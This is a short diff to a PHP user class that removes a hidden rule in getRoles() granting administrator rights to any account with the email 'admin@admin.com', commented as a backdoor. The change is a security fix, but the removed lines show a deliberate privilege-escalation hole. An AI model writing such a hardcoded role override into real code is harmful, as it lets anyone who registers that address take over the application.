@@ -89,10 +89,6 @@ class Voluntario implements UserInterface, PasswordAuthenticatedUserInterface
     
     public function getRoles(): array 
     { 
-        // BACKDOOR: Permitir que 'admin@admin.com' sea Administrador
-        if ($this->correo === 'admin@admin.com') {
-            return ['ROLE_ADMIN', 'ROLE_VOLUNTARIO'];
-        }
         return ['ROLE_VOLUNTARIO']; 
     }
     public function eraseCredentials(): void {}
